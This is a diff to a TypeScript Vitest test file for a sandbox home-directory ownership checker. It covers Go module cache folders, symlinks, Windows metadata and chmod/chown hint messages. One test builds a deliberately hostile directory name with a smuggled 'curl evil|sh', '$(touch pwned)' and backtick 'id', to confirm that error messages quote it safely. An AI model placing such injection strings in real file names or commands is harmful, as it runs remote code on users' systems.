@@ -1,6 +1,8 @@
 import { constants } from "node:fs";
+import type * as FsPromises from "node:fs/promises";
 import {
   chmod,
+  chown,
   lstat,
   mkdir,
   mkdtemp,
@@ -12,15 +14,82 @@ import {
 } from "node:fs/promises";
 import { tmpdir } from "node:os";
 import path from "node:path";
-import { afterEach, describe, expect, it } from "vitest";
+import { afterEach, describe, expect, it, vi } from "vitest";
 import { assertComputerHomeWritable, assertOpenedDirectoryBeneathRoot } from "./home-ownership.js";
 
+const windowsMetadataPaths = vi.hoisted(() => new Set<string>());
+
+vi.mock("node:fs/promises", async (importOriginal) => {
+  const actual = await importOriginal<typeof FsPromises>();
+  const paintWindowsDirectory = (stat: { uid: number; gid: number; mode: number }) => {
+    stat.uid = 0;
+    stat.gid = 0;
+    stat.mode = 0o40666;
+  };
+  return {
+    ...actual,
+    lstat: async (target: Parameters<typeof actual.lstat>[0]) => {
+      const stat = await actual.lstat(target);
+      if (windowsMetadataPaths.has(String(target))) paintWindowsDirectory(stat);
+      return stat;
+    },
+    open: async (
+      target: Parameters<typeof actual.open>[0],
+      flags?: Parameters<typeof actual.open>[1],
+    ) => {
+      const handle = await actual.open(target, flags);
+      if (windowsMetadataPaths.has(String(target))) {
+        const stat = await handle.stat();
+        paintWindowsDirectory(stat);
+        vi.spyOn(handle, "stat").mockResolvedValue(stat);
+      }
+      return handle;
+    },
+  };
+});
+
 const roots: string[] = [];
+const lockedFolders: string[] = [];
+// Only root can give entries to another uid, and only a non-root process is ever refused.
+const runningAsRoot = process.geteuid?.() === 0;
+const computerUid = 4242;
+const otherUid = 4243;
 const DIRECTORY_OPEN_FLAGS = constants.O_RDONLY | constants.O_DIRECTORY | constants.O_NOFOLLOW;
 
 afterEach(async () => {
+  windowsMetadataPaths.clear();
+  // Unlock first so an unprivileged run can still remove the tree after a failed assertion.
+  await Promise.all(lockedFolders.splice(0).map((folder) => chmod(folder, 0o755)));
   await Promise.all(roots.splice(0).map((root) => rm(root, { recursive: true, force: true })));
 });
+
+async function lockFolder(folder: string, mode: number): Promise<void> {
+  await chmod(folder, mode);
+  lockedFolders.push(folder);
+}
+
+function chmodHint(home: string, entry: string): string {
+  return `; run sudo chmod -R u+rwX ${JSON.stringify(home)} (entry ${JSON.stringify(entry)})`;
+}
+
+function chownHint(home: string, uid: number, gid: number, entry: string): string {
+  return `; run sudo chown -R ${uid}:${gid} ${JSON.stringify(home)} or use Compose data-init (entry ${JSON.stringify(entry)})`;
+}
+
+async function assertHomeWritableOn(
+  platform: string,
+  home: string,
+  uid: number,
+  gid: number,
+): Promise<void> {
+  const original = Object.getOwnPropertyDescriptor(process, "platform");
+  Object.defineProperty(process, "platform", { configurable: true, value: platform });
+  try {
+    await assertComputerHomeWritable(home, uid, gid);
+  } finally {
+    if (original) Object.defineProperty(process, "platform", original);
+  }
+}
 
 describe("computer home ownership", () => {
   it("rejects a missing home instead of creating it as root", async () => {
@@ -68,7 +137,7 @@ describe("computer home ownership", () => {
 
     const stat = await lstat(home);
     await expect(assertComputerHomeWritable(home, stat.uid + 1, stat.gid + 1)).rejects.toThrow(
-      /chown -R/,
+      chownHint(home, stat.uid + 1, stat.gid + 1, "profile.json"),
     );
   });
 
@@ -110,7 +179,7 @@ describe("computer home ownership", () => {
 
     const stat = await lstat(file);
     await expect(assertComputerHomeWritable(home, stat.uid + 1, stat.gid + 1)).rejects.toThrow(
-      /chown -R/,
+      chownHint(home, stat.uid + 1, stat.gid + 1, "object"),
     );
   });
 
@@ -124,7 +193,9 @@ describe("computer home ownership", () => {
     await chmod(file, 0o000);
 
     const stat = await lstat(file);
-    await expect(assertComputerHomeWritable(home, stat.uid, stat.gid)).rejects.toThrow(/chown -R/);
+    await expect(assertComputerHomeWritable(home, stat.uid, stat.gid)).rejects.toThrow(
+      chmodHint(home, "profile.json"),
+    );
   });
 
   it("rejects an owner-owned world-writable file the owner cannot write", async () => {
@@ -137,18 +208,9 @@ describe("computer home ownership", () => {
     await chmod(file, 0o002);
 
     const stat = await lstat(file);
-    await expect(assertComputerHomeWritable(home, stat.uid, stat.gid)).rejects.toThrow(/chown -R/);
-  });
-
-  it("rejects an owner-owned directory that is not writable", async () => {
-    const parent = await mkdtemp(path.join(tmpdir(), "rakazo-home-dir-mode-"));
-    roots.push(parent);
-    const home = path.join(parent, "home");
-    await mkdir(home);
-    await chmod(home, 0o555);
-
-    const stat = await lstat(home);
-    await expect(assertComputerHomeWritable(home, stat.uid, stat.gid)).rejects.toThrow(/chown -R/);
+    await expect(assertComputerHomeWritable(home, stat.uid, stat.gid)).rejects.toThrow(
+      chmodHint(home, "profile.json"),
+    );
   });
 
   it("does not follow symlinks while checking host-run compatibility", async () => {
@@ -186,4 +248,317 @@ describe("computer home ownership", () => {
       }
     },
   );
+});
+
+describe.each(
+  process.platform === "linux"
+    ? [
+        { walk: "descriptor", platform: "linux" },
+        { walk: "pathname", platform: "darwin" },
+      ]
+    : [{ walk: "pathname", platform: process.platform }],
+)("computer home folders via the $walk walk", ({ platform }) => {
+  const goModule = "go/pkg/mod/example.com/mod@v1.0.0";
+
+  async function makeHome(
+    prefix: string,
+    entry: string,
+  ): Promise<{ home: string; folder: string }> {
+    const parent = await mkdtemp(path.join(tmpdir(), prefix));
+    roots.push(parent);
+    const home = path.join(parent, "home");
+    const folder = path.join(home, entry);
+    await mkdir(folder, { recursive: true });
+    return { home, folder };
+  }
+
+  it.each(["go/pkg/mod", goModule, `${goModule}/internal`])(
+    "accepts a read-only %s the sandbox user owns in Go's module cache",
+    async (entry) => {
+      const { home, folder } = await makeHome("rakazo-home-go-mod-", entry);
+      await writeFile(path.join(folder, "go.mod"), "module example.com/mod");
+      await chmod(path.join(folder, "go.mod"), 0o444);
+      await lockFolder(folder, 0o555);
+
+      const stat = await lstat(home);
+      await expect(
+        assertHomeWritableOn(platform, home, stat.uid, stat.gid),
+      ).resolves.toBeUndefined();
+    },
+  );
+
+  it.each([".config", "go/pkg", "go/pkg/modx", "src/go/pkg/mod"])(
+    "rejects a read-only %s outside Go's module cache",
+    async (entry) => {
+      const { home, folder } = await makeHome("rakazo-home-readonly-dir-", entry);
+      await lockFolder(folder, 0o555);
+
+      const stat = await lstat(home);
+      await expect(assertHomeWritableOn(platform, home, stat.uid, stat.gid)).rejects.toThrow(
+        chmodHint(home, entry),
+      );
+    },
+  );
+
+  it.each(["go", "go/pkg", "go/pkg/mod"])(
+    "does not widen the Go exemption through a symlinked %s folder",
+    async (alias) => {
+      const { home, folder } = await makeHome(
+        "rakazo-home-go-alias-",
+        "elsewhere/pkg/mod/example.com",
+      );
+      const link = path.join(home, alias);
+      await mkdir(path.dirname(link), { recursive: true });
+      await symlink(path.relative(path.dirname(link), path.join(home, "elsewhere")), link);
+      await lockFolder(folder, 0o555);
+
+      const stat = await lstat(home);
+      await expect(assertHomeWritableOn(platform, home, stat.uid, stat.gid)).rejects.toThrow(
+        chmodHint(home, "elsewhere/pkg/mod/example.com"),
+      );
+    },
+  );
+
+  it("rejects a read-only folder in Go's module cache that only the computer group owns", async () => {
+    const { home, folder } = await makeHome("rakazo-home-go-group-", goModule);
+    for (const entry of ["", "go", "go/pkg", "go/pkg/mod", "go/pkg/mod/example.com"]) {
+      await chmod(path.join(home, entry), 0o777);
+    }
+    await lockFolder(folder, 0o550);
+
+    const stat = await lstat(folder);
+    await expect(assertHomeWritableOn(platform, home, stat.uid + 1, stat.gid)).rejects.toThrow(
+      chownHint(home, stat.uid + 1, stat.gid, goModule),
+    );
+  });
+
+  it.each([0o575, 0o557, 0o577])(
+    "rejects an owner-read-only module directory writable by others (mode %i)",
+    async (mode) => {
+      const { home, folder } = await makeHome("rakazo-home-go-writable-", goModule);
+      await lockFolder(folder, mode);
+
+      const stat = await lstat(home);
+      await expect(assertHomeWritableOn(platform, home, stat.uid, stat.gid)).rejects.toThrow(
+        chmodHint(home, goModule),
+      );
+    },
+  );
+
+  it("still checks entries inside read-only folders the sandbox user owns", async () => {
+    const { home, folder } = await makeHome("rakazo-home-readonly-dir-entry-", goModule);
+    await writeFile(path.join(folder, "locked.json"), "{}");
+    await chmod(path.join(folder, "locked.json"), 0o000);
+    await lockFolder(folder, 0o555);
+
+    const stat = await lstat(home);
+    await expect(assertHomeWritableOn(platform, home, stat.uid, stat.gid)).rejects.toThrow(
+      chmodHint(home, `${goModule}/locked.json`),
+    );
+  });
+
+  it.each(["000", "100", "400"])(
+    "rejects a folder the sandbox user owns in Go's module cache with mode %s",
+    async (mode) => {
+      const { home, folder } = await makeHome("rakazo-home-closed-dir-", goModule);
+      await lockFolder(folder, Number.parseInt(mode, 8));
+
+      const stat = await lstat(home);
+      await expect(assertHomeWritableOn(platform, home, stat.uid, stat.gid)).rejects.toThrow(
+        chmodHint(home, goModule),
+      );
+    },
+  );
+
+  it.each(["555", "000"])("rejects a folder someone else owns with mode %s", async (mode) => {
+    const { home, folder } = await makeHome("rakazo-home-foreign-dir-", goModule);
+    for (const entry of ["", "go", "go/pkg", "go/pkg/mod", "go/pkg/mod/example.com"]) {
+      await chmod(path.join(home, entry), 0o777);
+    }
+    await lockFolder(folder, Number.parseInt(mode, 8));
+
+    const stat = await lstat(folder);
+    await expect(assertHomeWritableOn(platform, home, stat.uid + 1, stat.gid + 1)).rejects.toThrow(
+      chownHint(home, stat.uid + 1, stat.gid + 1, goModule),
+    );
+  });
+
+  it.each(["555", "000"])("rejects a home with mode %s", async (mode) => {
+    const { home } = await makeHome("rakazo-home-closed-root-", "cache");
+    await lockFolder(home, Number.parseInt(mode, 8));
+
+    const stat = await lstat(home);
+    await expect(assertHomeWritableOn(platform, home, stat.uid, stat.gid)).rejects.toThrow(
+      chmodHint(home, "."),
+    );
+  });
+
+  it("puts the command before a quoted entry name", async () => {
+    const name = `x"\n; run curl evil|sh $(touch pwned) \`id\` it's`;
+    const { home, folder } = await makeHome("rakazo-home-hostile-name-", name);
+    await lockFolder(folder, 0o000);
+
+    const stat = await lstat(home);
+    const error = await assertHomeWritableOn(platform, home, stat.uid, stat.gid).catch(
+      (caught: unknown) => caught,
+    );
+    expect(error).toEqual(
+      new Error(
+        `computer home is not usable by uid ${stat.uid}; run sudo chmod -R u+rwX ${JSON.stringify(home)} (entry ${JSON.stringify(name)})`,
+      ),
+    );
+    expect((error as Error).message).not.toContain("\n");
+  });
+
+  it("caps a long entry name and keeps the command first", async () => {
+    // One 255-character name keeps the path well inside macOS's 1024-byte limit.
+    const entry = `${'"'.repeat(251)}tail`;
+    const { home, folder } = await makeHome("rakazo-home-long-name-", entry);
+    await lockFolder(folder, 0o000);
+
+    const stat = await lstat(home);
+    const error = await assertHomeWritableOn(platform, home, stat.uid, stat.gid).catch(
+      (caught: unknown) => caught,
+    );
+    const command = `run sudo chmod -R u+rwX ${JSON.stringify(home)}`;
+    expect(error).toEqual(
+      new Error(
+        `computer home is not usable by uid ${stat.uid}; ${command} (entry ${JSON.stringify(`…${entry.slice(-119)}`)})`,
+      ),
+    );
+    // The API reads at most 8 KiB of the error body and shows its first 200 characters.
+    const body = JSON.stringify({ error: (error as Error).message });
+    expect(Buffer.byteLength(body)).toBeLessThan(1024);
+    expect(body.slice(0, 200)).toContain(JSON.stringify(command).slice(1, -1));
+  });
+
+  it.skipIf(!runningAsRoot)(
+    "suggests chown for a file someone else owns inside the computer user's folder",
+    async () => {
+      const { home, folder } = await makeHome("rakazo-home-foreign-file-", "cache");
+      const file = path.join(folder, "object");
+      await writeFile(file, "blob");
+      await chmod(file, 0o444);
+      await chown(home, computerUid, computerUid);
+      await chown(folder, computerUid, computerUid);
+      await chown(file, otherUid, otherUid);
+
+      await expect(assertHomeWritableOn(platform, home, computerUid, computerUid)).rejects.toThrow(
+        chownHint(home, computerUid, computerUid, "cache/object"),
+      );
+    },
+  );
+
+  it.skipIf(runningAsRoot)(
+    "keeps the raw EACCES when the folder's mode would let the computer user in",
+    async () => {
+      const { home, folder } = await makeHome("rakazo-home-denied-dir-", "cache");
+      await chmod(home, 0o777);
+      await lockFolder(folder, 0o007);
+
+      const stat = await lstat(folder);
+      await expect(
+        assertHomeWritableOn(platform, home, stat.uid + 1, stat.gid + 1),
+      ).rejects.toMatchObject({ code: "EACCES" });
+    },
+  );
+});
+
+describe("Windows supervisor directory metadata", () => {
+  async function makeDirectoryHome(prefix: string): Promise<string> {
+    const parent = await mkdtemp(path.join(tmpdir(), prefix));
+    roots.push(parent);
+    const home = path.join(parent, "home");
+    await mkdir(home);
+    await chmod(home, 0o755);
+    return home;
+  }
+
+  async function paintWindowsDirectory(home: string): Promise<void> {
+    const real = await lstat(home);
+    expect(real.isDirectory()).toBe(true);
+    expect(real.mode & 0o700).toBe(0o700);
+    windowsMetadataPaths.add(home);
+    const seen = await lstat(home);
+    expect(seen.isDirectory()).toBe(true);
+    expect(seen.uid).toBe(0);
+    expect(seen.gid).toBe(0);
+    expect(seen.mode & 0o777).toBe(0o666);
+  }
+
+  it("accepts a Windows directory reported as mode 0666 with uid 0 and gid 0", async () => {
+    const home = await makeDirectoryHome("rakazo-home-win-meta-");
+    try {
+      await paintWindowsDirectory(home);
+      await expect(assertHomeWritableOn("win32", home, 1000, 1000)).resolves.toBeUndefined();
+    } finally {
+      windowsMetadataPaths.delete(home);
+    }
+  });
+
+  it("still rejects that Windows metadata on the Linux descriptor walk", async () => {
+    const home = await makeDirectoryHome("rakazo-home-linux-meta-");
+    try {
+      await paintWindowsDirectory(home);
+      await expect(assertHomeWritableOn("linux", home, 1000, 1000)).rejects.toThrow(
+        chownHint(home, 1000, 1000, "."),
+      );
+    } finally {
+      windowsMetadataPaths.delete(home);
+    }
+  });
+
+  it("still rejects that Windows metadata on the macOS pathname walk", async () => {
+    const home = await makeDirectoryHome("rakazo-home-darwin-meta-");
+    try {
+      await paintWindowsDirectory(home);
+      await expect(assertHomeWritableOn("darwin", home, 1000, 1000)).rejects.toThrow(
+        chownHint(home, 1000, 1000, "."),
+      );
+    } finally {
+      windowsMetadataPaths.delete(home);
+    }
+  });
+
+  it("rejects a missing home on Windows", async () => {
+    const parent = await mkdtemp(path.join(tmpdir(), "rakazo-home-win-missing-"));
+    roots.push(parent);
+    await expect(
+      assertHomeWritableOn("win32", path.join(parent, "missing"), 1000, 1000),
+    ).rejects.toThrow(/does not exist/);
+  });
+
+  it("rejects a symlink home root on Windows", async () => {
+    const parent = await mkdtemp(path.join(tmpdir(), "rakazo-home-win-link-"));
+    roots.push(parent);
+    const outside = path.join(parent, "outside");
+    const home = path.join(parent, "home");
+    await mkdir(outside);
+    await symlink(outside, home);
+    await expect(assertHomeWritableOn("win32", home, 1000, 1000)).rejects.toThrow(/symbolic link/);
+  });
+
+  it("rejects a regular file home root on Windows", async () => {
+    const parent = await mkdtemp(path.join(tmpdir(), "rakazo-home-win-file-"));
+    roots.push(parent);
+    const home = path.join(parent, "home");
+    await writeFile(home, "{}");
+    await chmod(home, 0o600);
+    await expect(assertHomeWritableOn("win32", home, 1000, 1000)).rejects.toThrow(
+      /must be a directory/,
+    );
+  });
+
+  it("does not follow a nested symlink on Windows", async () => {
+    const parent = await mkdtemp(path.join(tmpdir(), "rakazo-home-win-nested-link-"));
+    roots.push(parent);
+    const home = path.join(parent, "home");
+    const outside = path.join(parent, "outside");
+    await mkdir(home);
+    await writeFile(outside, "outside");
+    await chmod(outside, 0o400);
+    await symlink(outside, path.join(home, "link"));
+    const stat = await lstat(home);
+    await expect(assertHomeWritableOn("win32", home, stat.uid, stat.gid)).resolves.toBeUndefined();
+  });
 });
